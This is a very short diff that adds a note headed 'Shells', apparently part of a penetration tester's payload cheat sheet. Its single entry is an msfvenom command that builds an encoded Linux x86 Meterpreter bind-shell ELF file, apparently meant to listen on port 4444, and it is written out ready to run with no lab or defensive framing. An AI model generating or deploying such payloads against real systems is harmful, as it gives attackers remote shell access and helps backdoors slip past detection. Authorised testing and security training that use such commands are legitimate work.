@@ -1,0 +1,3 @@
+Shells
+
+linux_bind_shell_4444.elf: msfvenom -p linux/x86/meterpreter/bind_tcp -e x86/shikata_ga_nai -f elf > linux_bind_shell_4444.elf
